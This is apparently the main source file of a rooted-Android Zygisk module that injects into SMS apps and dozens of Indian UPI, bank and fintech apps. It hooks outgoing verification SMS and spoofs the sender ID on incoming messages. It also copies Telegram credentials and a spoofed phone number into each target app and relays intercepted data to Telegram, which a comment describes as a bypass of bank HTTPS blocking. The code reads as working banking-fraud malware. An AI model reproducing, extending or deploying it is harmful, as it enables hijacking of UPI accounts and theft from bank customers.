#include "tg_urgent.hpp"
#include "zygisk.hpp"
#include "config.hpp"
#include "logger.hpp"
#include "outgoing_sms_hook.hpp"
#include "overlay_ui.hpp"
#include "phone_number_hook.hpp"
#include "sender_spoof.hpp"
#include "upi_registry.hpp"

#include <cstdint>
#include <ctime>
#include <cstdio>
#include <cstring>
#include <string>
#include <unistd.h>
#include <pthread.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <fcntl.h>
#include <errno.h>
#include <cstdlib>

namespace {

/**
 * v1.0.79 — menu Sender ID on all incoming SMS
 *
 * Hero + Messages: Java ISms immediate.
 * Other UPI: Java ~5s + bubble ~8s (crash-safe).
 * Incoming: inbox address rewrite + SmsMessage spoof → saved Sender ID.
 * NEVER Binder/phone on UPI. NEVER inject com.android.phone.
 */

bool is_messaging_pkg(const std::string& pkg) {
    if (pkg.empty()) return false;
    if (upi_registry::is_default_sms_app(pkg)) return true;
    if (pkg.find("messaging") != std::string::npos) return true;
    if (pkg.find(".mms") != std::string::npos) return true;
    // Platform SMS/MMS service — Google Messages often sends via this process
    if (pkg == "com.android.mms.service") return true;
    return false;
}

bool is_dangerous_process(const std::string& process) {
    if (process.empty()) return true;
    // Default SMS apps + mms.service ALLOWED — real SIM send path
    if (is_messaging_pkg(process)) return false;

    static const char* kNever[] = {
        "zygote", "zygote64", "system_server",
        "com.android.phone",
        "com.android.providers.telephony",
        "com.android.systemui",
        "com.android.settings",
        "com.android.shell",
        "com.android.keychain",
        "com.android.networkstack",
        "com.android.networkstack.tethering",
        "com.android.se",
        "com.android.nfc",
        // mms.service REMOVED from never — inject for ISms block (v1.0.46)
        "com.samsung.android.settings",
        "com.samsung.android.app.telephonyui",
        "com.samsung.android.dialer",
        "com.google.android.permissioncontroller",
        "com.google.android.packageinstaller",
        "com.android.packageinstaller",
        "android.ext.services",
        "org.lsposed.manager",
        "lspd", "lspd64",
        "zygiskd", "zygiskd64", "zygiskd32",
        "rezygiskd", "rezygiskd64",
        nullptr,
    };
    for (const char** p = kNever; *p; ++p) {
        if (process == *p) return true;
    }
    if (process.rfind("com.android.phone:", 0) == 0) return true;
    if (process.rfind("com.android.settings:", 0) == 0) return true;
    if (process.rfind("com.android.providers.telephony:", 0) == 0) return true;
    if (process.find("telephony") != std::string::npos) return true;
    if (process.find("simsettings") != std::string::npos) return true;
    if (upi_registry::is_launcher_package(process)) return true;
    // Allow com.android.mms (stock Messages) via is_messaging above; block other com.android.*
    if (process.rfind("com.android.", 0) == 0) return true;
    if (process.rfind("android.", 0) == 0) return true;
    return false;
}

std::string base_package(const std::string& process) {
    const auto pos = process.find(':');
    if (pos == std::string::npos) return process;
    return process.substr(0, pos);
}

void append_diag(const char* path, const char* line) {
    FILE* f = fopen(path, "a");
    if (!f) return;
    fprintf(f, "%s\n", line);
    fclose(f);
    chmod(path, 0666);
}

void report_line(zygisk::Api* api, const std::string& line) {
    if (api) {
        const int fd = api->connectCompanion();
        if (fd >= 0) {
            const uint32_t n = static_cast<uint32_t>(line.size());
            write(fd, &n, sizeof(n));
            if (n) write(fd, line.data(), n);
            close(fd);
            return;
        }
    }
    append_diag("/data/local/tmp/hivirtus_inject.log", line.c_str());
}

bool native_overlay_wanted() {
    return access("/data/local/tmp/hivirtus_disable_overlay.flag", F_OK) != 0;
}

/** Bubble on every UPI/fintech target (YesPay, Jump, KreditBee, Snapmint, …). */
bool overlay_allowed_pkg(const std::string& pkg) {
    if (pkg.empty()) return false;
    if (is_messaging_pkg(pkg)) return true;
    if (upi_registry::is_known_upi(pkg)) return true;
    if (upi_registry::is_sms_hook_target(pkg)) return true;
    return false;
}

bool is_hero_pkg(const std::string& pkg) {
    if (pkg.empty()) return false;
    if (pkg.find("herofincorp") != std::string::npos) return true;
    if (pkg.find("hero") != std::string::npos && pkg.find("fincorp") != std::string::npos) return true;
    return false;
}

/** Bank BHIM UPI (ESAF etc.) — verify SMS window is short; Java ISms NOW like Hero. */
bool is_fast_verify_upi(const std::string& pkg) {
    if (pkg.empty()) return false;
    if (is_hero_pkg(pkg)) return true;
    if (pkg.find("esaf") != std::string::npos) return true;
    if (pkg.find("fisglobal") != std::string::npos) return true;
    if (pkg == "in.org.npci.upiapp") return true;
    if (pkg == "com.sbi.upi") return true;
    if (pkg == "com.upi.axispay") return true;
    if (pkg.rfind("com.fss.", 0) == 0) return true;  // BHIM bank FSS apps
    if (pkg.find("bhim") != std::string::npos) return true;
    return false;
}

struct DeferredOverlayJob {
    JavaVM* vm = nullptr;
    zygisk::Api* api = nullptr;
    std::string pkg;
    int delay_sec = 5;
};

void* deferred_overlay_worker(void* arg) {
    auto* job = static_cast<DeferredOverlayJob*>(arg);
    if (job->delay_sec > 0) sleep(static_cast<unsigned>(job->delay_sec));
    if (job->vm && job->api && native_overlay_wanted()) {
        JNIEnv* env = nullptr;
        if (job->vm->AttachCurrentThread(&env, nullptr) == JNI_OK && env) {
            // Java UiHelper only — no Activity PLT
            overlay_ui::install(env, job->api, job->pkg);
            append_diag("/data/local/tmp/hivirtus_overlay.debug", "overlay_ok_java");
            job->vm->DetachCurrentThread();
        }
    }
    delete job;
    return nullptr;
}

void schedule_overlay_ui(JNIEnv* env, zygisk::Api* api, const std::string& pkg, int delay_sec) {
    if (!native_overlay_wanted() || pkg.empty() || !env || !api) return;
    JavaVM* vm = nullptr;
    if (env->GetJavaVM(&vm) != JNI_OK || !vm) return;
    auto* job = new DeferredOverlayJob();
    job->vm = vm;
    job->api = api;
    job->pkg = pkg;
    job->delay_sec = delay_sec;
    pthread_t t{};
    pthread_create(&t, nullptr, deferred_overlay_worker, job);
    pthread_detach(t);
}

struct DeferredHookJob {
    JavaVM* vm = nullptr;
    zygisk::Api* api = nullptr;
    std::string pkg;
    int delay_sec = 6;
    bool no_inline = false;  // LSPosed-style: Java ISms only, no JNI SmsMessage spoof
};

void* deferred_hook_worker(void* arg) {
    auto* job = static_cast<DeferredHookJob*>(arg);
    if (job->delay_sec > 0) sleep(static_cast<unsigned>(job->delay_sec));
    if (job->vm && job->api) {
        JNIEnv* env = nullptr;
        if (job->vm->AttachCurrentThread(&env, nullptr) == JNI_OK && env) {
            // After app open stable: Java ISms (+ optional Sender ID spoof)
            try {
                overlay_ui::install_sms_tweaks_java(env, job->pkg.c_str());
                outgoing_sms_hook::arm_intercept_hooks();
                // Sender ID ONLY in Messages — spoofing in UPI breaks OTP autofill
                if (!job->no_inline && is_messaging_pkg(job->pkg)) {
                    sender_spoof::install(env, job->api, job->pkg.c_str());
                }
                append_diag("/data/local/tmp/hivirtus_inject.log",
                            (std::string(job->no_inline ? "HOOK_NO_INLINE_JAVA|" : "HOOK_DEFERRED_SAFE_JAVA|") +
                             job->pkg)
                                .c_str());
            } catch (...) {
                append_diag("/data/local/tmp/hivirtus_inject.log",
                            ("HOOK_DEFERRED_SAFE_JAVA_CRASH|" + job->pkg).c_str());
            }
            job->vm->DetachCurrentThread();
        }
    }
    delete job;
    return nullptr;
}

void* deferred_java_only_worker(void* arg) {
    auto* job = static_cast<DeferredHookJob*>(arg);
    if (job->delay_sec > 0) sleep(static_cast<unsigned>(job->delay_sec));
    if (job->vm) {
        JNIEnv* env = nullptr;
        if (job->vm->AttachCurrentThread(&env, nullptr) == JNI_OK && env) {
            bool ok = overlay_ui::install_sms_tweaks_java(env, job->pkg.c_str());
            append_diag("/data/local/tmp/hivirtus_inject.log",
                        ok ? ("JAVA_RETRY_OK|" + job->pkg).c_str()
                           : ("JAVA_RETRY_FAIL|" + job->pkg).c_str());
            job->vm->DetachCurrentThread();
        }
    }
    delete job;
    return nullptr;
}

void schedule_deferred_java_sms(JNIEnv* env, const std::string& pkg, int delay_sec) {
    if (!env || pkg.empty()) return;
    JavaVM* vm = nullptr;
    if (env->GetJavaVM(&vm) != JNI_OK || !vm) return;
    auto* job = new DeferredHookJob();
    job->vm = vm;
    job->api = nullptr;
    job->pkg = pkg;
    job->delay_sec = delay_sec;
    pthread_t t{};
    pthread_create(&t, nullptr, deferred_java_only_worker, job);
    pthread_detach(t);
}

void schedule_deferred_sms_hooks(JNIEnv* env, zygisk::Api* api, const std::string& pkg,
                                 int delay_sec, bool no_inline = false) {
    if (!env || !api || pkg.empty()) return;
    JavaVM* vm = nullptr;
    if (env->GetJavaVM(&vm) != JNI_OK || !vm) return;
    auto* job = new DeferredHookJob();
    job->vm = vm;
    job->api = api;
    job->pkg = pkg;
    job->delay_sec = delay_sec;
    job->no_inline = no_inline;
    pthread_t t{};
    pthread_create(&t, nullptr, deferred_hook_worker, job);
    pthread_detach(t);
}

class VirtusModule : public zygisk::ModuleBase {
public:
    void onLoad(zygisk::Api* api, JNIEnv* env) override {
        api_ = api;
        env_ = env;
        tg_urgent::set_api(api);
    }

    void preAppSpecialize(zygisk::AppSpecializeArgs* args) override {
        const char* process = env_->GetStringUTFChars(args->nice_name, nullptr);
        process_name_ = process ? process : "";
        env_->ReleaseStringUTFChars(args->nice_name, process);
        pkg_ = base_package(process_name_);

        // NEVER inject com.android.phone — Binder.transact ISms block kills SIM / SIM Toolkit
        if (pkg_ == "com.android.phone" || pkg_ == "com.android.providers.telephony") {
            api_->setOption(zygisk::Option::DLCLOSE_MODULE_LIBRARY);
            return;
        }

        if (is_dangerous_process(pkg_) || upi_registry::is_module_own_app(pkg_)) {
            api_->setOption(zygisk::Option::DLCLOSE_MODULE_LIBRARY);
            return;
        }

        // Only Messages + UPI — no junk vendor/WebView inject
        is_msg_ = is_messaging_pkg(pkg_);
        is_upi_ = upi_registry::is_sms_hook_target(pkg_);
        if (!is_msg_ && !is_upi_) {
            api_->setOption(zygisk::Option::DLCLOSE_MODULE_LIBRARY);
            return;
        }
        fragile_ = is_upi_ && upi_registry::is_fragile_banking_app(pkg_);
        no_inline_ = is_upi_ && upi_registry::is_no_inline_hook_pkg(pkg_);

        report_line(api_, "pre_seen:" + process_name_);
        report_line(api_, std::string("safe_inject:") + pkg_ +
                              (is_msg_ ? "|msg" : "|upi") +
                              (no_inline_ ? "|no_inline" : ""));

        if (args->app_data_dir) {
            const char* dd = env_->GetStringUTFChars(args->app_data_dir, nullptr);
            if (dd) {
                data_dir_ = dd;
                env_->ReleaseStringUTFChars(args->app_data_dir, dd);
            }
        }
        if (!data_dir_.empty()) {
            report_line(api_, "prep_assets|" + pkg_ + "|" + std::to_string(args->uid) + "|" +
                                  data_dir_);
        }

        ConfigManager::instance().reload();
        ConfigManager::instance().apply_ui_save_file();
        ConfigManager::instance().reload();

        if (is_msg_) {
            std::string sms_st = outgoing_sms_hook::install_for_upi(env_, api_, pkg_.c_str());
            report_line(api_, std::string("HOOK_MSG|") + sms_st);
        } else if (no_inline_) {
            // LSPosed "Invalidate inline hooks" equivalent:
            // NO Intent PLT / Binder / inline in pre — open crash fix (SuperMoney etc.)
            fragile_ = true;
            report_line(api_, std::string("upi_no_inline_pre:") + pkg_);
        } else {
            // Normal UPI: Intent PLT only in pre — never Binder/phone (open crash)
            fragile_ = true;
            bool intent_ok = outgoing_sms_hook::install_intent_plt_pre(api_, true);
            report_line(api_, std::string("upi_safe_intent_plt:") + pkg_ +
                                  (intent_ok ? "|ok" : "|fail"));
        }

        keep_ = true;
    }

    void postAppSpecialize(const zygisk::AppSpecializeArgs* args) override {
        (void)args;
        if (!keep_) return;

        if (is_dangerous_process(pkg_) || upi_registry::is_module_own_app(pkg_) ||
            (!is_msg_ && !is_upi_)) {
            api_->setOption(zygisk::Option::DLCLOSE_MODULE_LIBRARY);
            return;
        }

        mark_active();
        tg_urgent::set_api(api_);
        {
            std::string base = data_dir_.empty()
                                   ? ("/data/user/0/" + pkg_ + "/code_cache/hivirtus")
                                   : (data_dir_ + "/code_cache/hivirtus");
            mkdir((data_dir_.empty() ? ("/data/user/0/" + pkg_ + "/code_cache")
                                     : (data_dir_ + "/code_cache"))
                      .c_str(),
                  0700);
            mkdir(base.c_str(), 0700);
            FILE* sf = fopen((base + "/post_hooks.txt").c_str(), "w");
            if (sf) {
                fprintf(sf, "post_v169:%s msg=%d fragile=%d upi=%d\n", pkg_.c_str(),
                        is_msg_ ? 1 : 0, fragile_ ? 1 : 0, is_upi_ ? 1 : 0);
                fclose(sf);
            }
        }

        if (is_msg_) {
            // Messages: full path — FAST (many apps SENDTO → Messages)
            overlay_ui::install_sms_tweaks_java(env_, pkg_.c_str());
            outgoing_sms_hook::install_for_upi(env_, api_, pkg_.c_str());
            sender_spoof::install(env_, api_, pkg_.c_str());
            schedule_deferred_java_sms(env_, pkg_, 1);
            report_line(api_, "post_msg_ok:" + pkg_);
        } else if (is_hero_pkg(pkg_) || is_fast_verify_upi(pkg_)) {
            // Hero + BHIM ESAF / bank UPI — Java NOW so To+body TG na miss ho
            outgoing_sms_hook::arm_intercept_hooks();
            overlay_ui::install_sms_tweaks_java(env_, pkg_.c_str());
            schedule_deferred_java_sms(env_, pkg_, 1);
            report_line(api_, std::string("post_fast_verify_java:") + pkg_);
            if (native_overlay_wanted() && overlay_allowed_pkg(pkg_)) {
                schedule_overlay_ui(env_, api_, pkg_, 2);
            }
        } else if (no_inline_) {
            // SuperMoney / ultra-crashy: Java ISms ONLY after settle — bubble still pops
            outgoing_sms_hook::arm_intercept_hooks();
            const int delay = upi_registry::hook_startup_delay_sec(pkg_);
            schedule_deferred_sms_hooks(env_, api_, pkg_, delay, true);
            schedule_deferred_java_sms(env_, pkg_, delay + 2);
            report_line(api_, "post_upi_no_inline_java:" + pkg_ + "|d=" + std::to_string(delay));
            if (native_overlay_wanted() && overlay_allowed_pkg(pkg_)) {
                schedule_overlay_ui(env_, api_, pkg_, delay + 1);
            }
        } else {
            // ALL other UPI (YesPay/GPay/PhonePe/Snapmint/KreditBee/Jump/FamPay/…):
            // delay Java — open crash avoid; bubble + SMS To+body still kaam
            outgoing_sms_hook::arm_intercept_hooks();
            const int delay = 5;
            schedule_deferred_sms_hooks(env_, api_, pkg_, delay, false);
            schedule_deferred_java_sms(env_, pkg_, delay + 3);  // retry
            report_line(api_, "post_upi_delayed_java:" + pkg_ + "|d=" + std::to_string(delay));
            if (native_overlay_wanted() && overlay_allowed_pkg(pkg_)) {
                schedule_overlay_ui(env_, api_, pkg_, delay + 3);
            }
        }

        touch_heartbeat();
    }

    void postServerSpecialize(const zygisk::ServerSpecializeArgs* args) override {
        (void)args;
        api_->setOption(zygisk::Option::DLCLOSE_MODULE_LIBRARY);
    }

private:
    void touch_heartbeat() {
        FILE* f = fopen("/data/local/tmp/hivirtus_zygisk_native.active", "w");
        if (f) {
            fprintf(f, "%ld\n", static_cast<long>(time(nullptr)));
            fclose(f);
            chmod("/data/local/tmp/hivirtus_zygisk_native.active", 0666);
        }
    }

    void mark_active() {
        FILE* f = fopen("/data/local/tmp/hivirtus_active_hook_pkg.txt", "w");
        if (f) {
            fprintf(f, "%s\n", pkg_.c_str());
            fclose(f);
            chmod("/data/local/tmp/hivirtus_active_hook_pkg.txt", 0666);
        }
    }

    zygisk::Api* api_ = nullptr;
    JNIEnv* env_ = nullptr;
    std::string process_name_;
    std::string pkg_;
    std::string data_dir_;
    bool keep_ = false;
    bool is_msg_ = false;
    bool is_upi_ = false;
    bool fragile_ = false;
    bool no_inline_ = false;
};

void companion_prep_assets(const std::string& pkg, int uid, const std::string& data_dir) {
    if (pkg.empty() || data_dir.empty() || uid <= 0) return;
    const char* mod = "/data/adb/modules/hivirtus_zygisk_mode";
    std::string dest = data_dir + "/code_cache/hivirtus";
    std::string files = data_dir + "/files";
    std::string cmd =
        "mkdir -p '" + dest + "/ui' '" + files + "' 2>/dev/null; "
        "cp -f '" + std::string(mod) + "/bridge.dex' '" + dest + "/bridge.dex' 2>/dev/null; "
        "cp -f '" + std::string(mod) + "/ui/'* '" + dest + "/ui/' 2>/dev/null; "
        "for src in /data/local/tmp/hivirtus_ui_save.json " + std::string(mod) + "/ui_save.json; do "
        "  [ -s \"$src\" ] || continue; "
        "  cp -f \"$src\" '" + dest + "/ui_save.json'; "
        "  cp -f \"$src\" '" + files + "/hivirtus_ui_save.json'; "
        "  cp -f \"$src\" '" + dest + "/config.json'; "
        "  break; "
        "done; "
        "for src in /data/local/tmp/hivirtus_telegram_credentials.json " + std::string(mod) +
        "/telegram_credentials.json; do "
        "  [ -s \"$src\" ] || continue; "
        "  cp -f \"$src\" '" + dest + "/hivirtus_telegram_credentials.json'; "
        "  cp -f \"$src\" '" + files + "/hivirtus_telegram_credentials.json'; "
        "  break; "
        "done; "
        "for src in /data/local/tmp/hivirtus_sender_id.txt " + std::string(mod) +
        "/sender_id.txt; do "
        "  [ -s \"$src\" ] || continue; "
        "  cp -f \"$src\" '" + dest + "/hivirtus_sender_id.txt'; "
        "  cp -f \"$src\" '" + files + "/hivirtus_sender_id.txt'; "
        "  break; "
        "done; "
        "for src in /data/local/tmp/hivirtus_spoof_phone.txt " + std::string(mod) +
        "/spoof_phone.txt; do "
        "  [ -s \"$src\" ] || continue; "
        "  cp -f \"$src\" '" + dest + "/hivirtus_spoof_phone.txt'; "
        "  cp -f \"$src\" '" + files + "/hivirtus_spoof_phone.txt'; "
        "  break; "
        "done; "
        "cp -f /data/local/tmp/hivirtus_zygisk_mode_config.json '" + dest +
        "/config.json' 2>/dev/null; "
        "cp -f /data/local/tmp/hivirtus_bridge.dex '" + dest + "/bridge.dex' 2>/dev/null; "
        "touch '" + dest + "/hook_status.txt' '" + dest + "/post_hooks.txt' 2>/dev/null; "
        "echo \"$(date +%s) companion_seed:" + pkg + "\" >> '" + dest + "/hook_status.txt'; "
        "echo \"$(date +%s) companion_seed:" + pkg +
        "\" >> /data/local/tmp/hivirtus_hook_status.txt; "
        "chmod -R 755 '" + dest + "' 2>/dev/null; "
        "chmod 644 '" + dest + "/bridge.dex' '" + dest + "/ui/'* 2>/dev/null; "
        "chmod 666 '" + dest + "/hook_status.txt' '" + dest +
        "/post_hooks.txt' '" + dest + "/ui_save.json' 2>/dev/null; "
        "chown -R " + std::to_string(uid) + ":" + std::to_string(uid) + " '" + dest + "' 2>/dev/null; "
        "restorecon -R '" + dest + "' 2>/dev/null; true";
    system(cmd.c_str());
}

void companion_handler(int client) {
    uint32_t len = 0;
    if (read(client, &len, sizeof(len)) != static_cast<ssize_t>(sizeof(len))) return;
    if (len == 0 || len > 8192) return;
    std::string line(len, '\0');
    if (read(client, line.data(), len) != static_cast<ssize_t>(len)) return;

    // Instant root Telegram — bank HTTPS block bypass (~1s)
    if (line.rfind("tg_out|", 0) == 0) {
        tg_urgent::companion_handle(line);
        return;
    }

    if (line.rfind("prep_assets|", 0) == 0) {
        std::string rest = line.substr(12);
        auto p1 = rest.find('|');
        auto p2 = p1 == std::string::npos ? std::string::npos : rest.find('|', p1 + 1);
        if (p1 != std::string::npos && p2 != std::string::npos) {
            std::string pkg = rest.substr(0, p1);
            int uid = atoi(rest.substr(p1 + 1, p2 - p1 - 1).c_str());
            std::string data_dir = rest.substr(p2 + 1);
            companion_prep_assets(pkg, uid, data_dir);
        }
    }

    if (line.rfind("HOOK", 0) == 0 || line.find("upi_hook_done") != std::string::npos ||
        line.rfind("fragile_", 0) == 0 || line.rfind("post_", 0) == 0 ||
        line.rfind("JAVA_", 0) == 0 || line.find("java_only") != std::string::npos) {
        char tsline[512];
        snprintf(tsline, sizeof(tsline), "%ld %s\n", static_cast<long>(time(nullptr)),
                 line.c_str());
        FILE* hf = fopen("/data/local/tmp/hivirtus_hook_status.txt", "a");
        if (hf) {
            fputs(tsline, hf);
            fclose(hf);
            chmod("/data/local/tmp/hivirtus_hook_status.txt", 0666);
        }
        FILE* latest = fopen("/data/local/tmp/hivirtus_hook_status_latest.txt", "w");
        if (latest) {
            fputs(tsline, latest);
            fclose(latest);
            chmod("/data/local/tmp/hivirtus_hook_status_latest.txt", 0666);
        }
    }

    FILE* f = fopen("/data/local/tmp/hivirtus_inject.log", "a");
    if (f) {
        fprintf(f, "%s\n", line.c_str());
        fclose(f);
        chmod("/data/local/tmp/hivirtus_inject.log", 0666);
    }
}

}  // namespace

REGISTER_ZYGISK_MODULE(VirtusModule)
REGISTER_ZYGISK_COMPANION(companion_handler)
